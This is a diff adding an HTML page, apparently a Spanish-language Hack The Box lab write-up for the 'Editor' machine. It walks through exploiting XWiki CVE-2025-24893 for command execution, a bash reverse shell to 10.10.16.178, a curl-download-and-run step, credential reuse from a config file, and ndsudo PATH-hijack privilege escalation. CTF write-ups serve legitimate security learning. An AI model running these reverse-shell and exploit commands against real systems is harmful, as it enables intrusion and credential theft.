@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Editor HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/editor/pasted-20260407023950.png" alt="Editor HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Editor</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SUID</span>
+            <span>netdata</span>
+            <span>ndsudo</span>
+            <span>xwiki</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing de vhosts para descubrir XWiki</li>
+            <li><code>Explotación</code>: CVE-2025-24893 en XWiki para ejecutar comandos y lanzar reverse shell</li>
+            <li><code>Movimiento lateral</code>: Configuración de XWiki revela contraseña reutilizable por SSH para <code>oliver</code></li>
+            <li><code>Escalada de Privilegios</code>: Abuso de <code>ndsudo</code> del grupo netdata mediante path hijacking</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407201316.png" alt="Editor HTB" />
+          <div class="code-card">
+            <h3>Fuzzear vhosts</h3>
+            <pre><code>gobuster vhost -u http://10.129.17.22 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain editor.htb --append-domain
+# Subdominio -&gt; http://wiki.editor.htb/xwiki</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407201813.png" alt="Editor HTB" />
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407201958.png" alt="Editor HTB" />
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407202025.png" alt="Editor HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <p><a href="https://github.com/D3Ext/CVE-2025-24893/blob/main/CVE-2025-24893.py">Exploit</a></p>
+          <div class="code-card">
+            <h3>RCE</h3>
+            <pre><code>python3 CVE-2025-24893.py --url  http://wiki.editor.htb/xwiki --command whoami</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407201803.png" alt="Editor HTB" />
+          <div class="code-card">
+            <h3>bash.sh</h3>
+            <pre><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.16.178/443 0&gt;&amp;1</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># Listener puerto 443
+# Servir bash.sh
+python3 CVE-2025-24893.py --url  http://wiki.editor.htb/xwiki --command "curl http://10.10.16.178/bash.sh -o /tmp/bash.sh"
+
+python3 CVE-2025-24893.py --url  http://wiki.editor.htb/xwiki --command "chmod +x /tmp/bash.sh"
+
+python3 CVE-2025-24893.py --url  http://wiki.editor.htb/xwiki --command "bash /tmp/bash.sh"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407205523.png" alt="Editor HTB" />
+          <div class="code-card">
+            <h3>Ficheros de configuración</h3>
+            <pre><code>cat /etc/xwiki/hibernate.cfg.xml
+# Credenciales -&gt; xwiki:theEd1t0rTeam99</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407205827.png" alt="Editor HTB" />
+          <div class="code-card">
+            <h3>Reutilizamos la contraseña de la BD para acceder por SSH como oliver</h3>
+            <pre><code>ssh oliver@10.129.17.22
+# Password: theEd1t0rTeam99</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: SUID ndsudo del grupo netdata</h2>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407232436.png" alt="Editor HTB" />
+          <p><a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">GitHub Poc</a></p>
+          <div class="code-card">
+            <h3>Compilar payload</h3>
+            <pre><code># Kali
+gcc poc.c -o nvme
+# Transferir fichero nvme a Linux y comprobar integridad con md5sum
+# Linux
+chmod +x /tmp/nvme
+export PATH=/tmp:$PATH
+./ndsudo nvme-list</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editor/pasted-20260407232521.png" alt="Editor HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SUID</span>
+            <span>netdata</span>
+            <span>ndsudo</span>
+            <span>xwiki</span>
+            <span>vhosts</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
